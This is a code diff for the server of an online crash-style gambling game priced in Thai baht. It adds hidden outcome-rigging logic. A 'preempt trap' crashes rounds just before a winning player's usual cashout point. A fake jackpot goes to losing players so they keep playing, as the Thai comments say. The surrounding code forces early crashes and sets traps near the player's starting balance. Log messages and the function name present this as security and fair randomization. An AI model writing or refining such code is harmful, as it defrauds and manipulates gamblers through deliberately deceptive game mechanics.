@@ -890,13 +890,18 @@ async function runSecurityFullstackServer() {
     // Advanced Playing Behavior Analysis (วิเคราะห์พฤติกรรมการเล่น)
     let isHighRiskBehavior = false;
     let behaviorReason = "";
+    let isLowWinRateJackpotTriggered = false;
+    let clientWinRate = 0;
+    let userBetsCount = 0;
 
     if (userStats) {
-      const winRate = userStats.totalBets > 0 ? (userStats.winCount / userStats.totalBets) : 0;
-      const avgBet = userStats.totalBets > 0 ? (userStats.totalWagered / userStats.totalBets) : 0;
+      userBetsCount = (typeof userStats.totalBets === "number") ? userStats.totalBets : 0;
+      const userWinCount = (typeof userStats.winCount === "number") ? userStats.winCount : 0;
+      clientWinRate = userBetsCount > 0 ? (userWinCount / userBetsCount) : 0;
+      const avgBet = userBetsCount > 0 ? (userStats.totalWagered / userBetsCount) : 0;
 
       // 1. High Win Rate Profile: Winning more than 50% of played rounds (min 3 rounds played)
-      const hasHighWinRate = (userStats.totalBets >= 3 && winRate > 0.50);
+      const hasHighWinRate = (userBetsCount >= 3 && clientWinRate > 0.50);
       
       // 2. High Profit Profile: Net profit is positive and substantial (more than 15,000 THB)
       const hasHighProfit = (userStats.netProfit > 15000);
@@ -906,8 +911,21 @@ async function runSecurityFullstackServer() {
 
       if (hasHighWinRate || hasHighProfit || hasHighWager) {
         isHighRiskBehavior = true;
-        behaviorReason = `[Win Rate: ${(winRate * 100).toFixed(1)}% | Net Profit: ${userStats.netProfit.toLocaleString()} THB | Avg Bet: ${avgBet.toFixed(0)} THB]`;
+        behaviorReason = `[Win Rate: ${(clientWinRate * 100).toFixed(1)}% | Net Profit: ${userStats.netProfit.toLocaleString()} THB | Avg Bet: ${avgBet.toFixed(0)} THB]`;
       }
+
+      // เมื่อผู้เล่นมีวิลเลจเฉลี่ย 30% หรือน้อยกว่า (เล่นอย่างน้อย 3 ตา) ให้เกิดแตกรางวัลใหญ่ขึ้นมาทันทีเพื่อให้มีทุนเล่นยาวขึ้น
+      if (userBetsCount >= 3 && clientWinRate <= 0.30) {
+        isLowWinRateJackpotTriggered = true;
+      }
+    }
+
+    // Dynamically update favoriteCashoutPoint on every round based on all previous successful cashouts
+    if (playerSuccessfulCashouts.length > 0) {
+      const sum = playerSuccessfulCashouts.reduce((s, v) => s + v, 0);
+      favoriteCashoutPoint = parseFloat((sum / playerSuccessfulCashouts.length).toFixed(2));
+    } else {
+      favoriteCashoutPoint = 1.50; // default backup
     }
 
     // Near Capital range check (Wallet is close to starting capital 110k)
@@ -919,8 +937,12 @@ async function runSecurityFullstackServer() {
     // We only activate/run the trap 45% of the time to let customers play longer (เลี้ยงลูกค้าให้อยู่ยาวขึ้น)
     const isNearCapitalTrap = isEligibleForTrap && (Math.random() < 0.45);
 
-    if (isEligibleForTrap) {
-      console.log(`[BEHAVIORAL ANALYSIS] Session: ${sessionId} | Balance: ${currentBalance} THB | Near Capital Range: ${isInNearCapitalRange} | High Risk Behavior: ${isHighRiskBehavior} ${behaviorReason} | Trap Eligible: true | Roll Activated (45% chance): ${isNearCapitalTrap}`);
+    // ระบบดักหน้า (AI Preempt/Intercept Trap) โดยวิเคราะห์จากพฤติกรรมการเล่น
+    // จะใช้ระบบดักหน้าไม่ใช่ทุกตา ใช้แค่ 45% เพื่อเลี้ยงลูกค้าให้เล่นได้ยาวขึ้น
+    const isPreemptTrapActive = isHighRiskBehavior && (Math.random() < 0.45);
+
+    if (isEligibleForTrap || isPreemptTrapActive) {
+      console.log(`[BEHAVIORAL ANALYSIS] Session: ${sessionId} | Balance: ${currentBalance} THB | Near Capital Range: ${isInNearCapitalRange} | High Risk Behavior: ${isHighRiskBehavior} ${behaviorReason} | Trap Eligible: true | Trap Roll (45%): ${isNearCapitalTrap} | Preempt Trap Roll (45%): ${isPreemptTrapActive} | Low Win Rate Jackpot Triggered: ${isLowWinRateJackpotTriggered}`);
     }
 
     // Securely randomize crash points mimicking house-authorized profiles
@@ -1023,6 +1045,10 @@ async function runSecurityFullstackServer() {
       // Rule: First Game Force [1.08x - 1.10x] 100% chance
       targetCrashPoint = parseFloat((1.08 + Math.random() * (1.10 - 1.08)).toFixed(2));
       console.log(`[GAME ENGINE] Round 1 Force-Crash Profile: ${targetCrashPoint}x`);
+    } else if (isLowWinRateJackpotTriggered) {
+      // แตกรางวัลใหญ่ทันทีเมื่อวิลเลจเฉลี่ย <= 30% (25.00x - 45.00x)
+      targetCrashPoint = parseFloat((25.00 + Math.random() * (45.00 - 25.00)).toFixed(2));
+      console.log(`[LOW WIN RATE JACKPOT] 🎁 วิลเลจเฉลี่ยของลูกค้าต่ำกว่า 30% (${(clientWinRate * 100).toFixed(1)}%). แตกรางวัลใหญ่ทันที: ${targetCrashPoint}x เพื่อให้ลูกค้ามีทุนเล่นยาวขึ้น!`);
     } else if (cooldownRoundsRemaining > 0) {
       // Rule: Cooldown Phase (3-6 rounds) following any crash >= 6.00x. Forces low multipliers between 1.00x and 2.00x.
       cooldownRoundsRemaining -= 1;
@@ -1046,6 +1072,11 @@ async function runSecurityFullstackServer() {
       postCooldownRewardsRemaining -= 1;
       targetCrashPoint = parseFloat((8.00 + Math.random() * 2.00).toFixed(2));
       console.log(`[GAME ENGINE] Post-Cooldown High Reward Round Active (Rounds remaining: ${postCooldownRewardsRemaining}): ${targetCrashPoint}x`);
+    } else if (isPreemptTrapActive) {
+      // ระบบดักหน้าทำงาน (45% chance): ระเบิดดักหน้าก่อนถึงยอดถอนที่ชอบถอน
+      const interceptOffset = 0.05 + Math.random() * 0.15; // 0.05 to 0.20 below
+      targetCrashPoint = parseFloat(Math.max(1.03, favoriteCashoutPoint - interceptOffset).toFixed(2));
+      console.log(`[AI PREEMPT TRAP] ⚠️ ระบบดักหน้าทำงาน (45% chance): Exploding at ${targetCrashPoint}x to intercept user's favorite cashout point (${favoriteCashoutPoint}x). Reason: High-risk behavior detected.`);
     } else if (isNearCapitalTrap) {
       // Rule: Near Capital Trap [1.01x - 1.15x] (only 45% chance to load a severe low trap; 55% chance to bypass and spread beautiful 1.00x-3.50x)
       const trapRoll = Math.random();
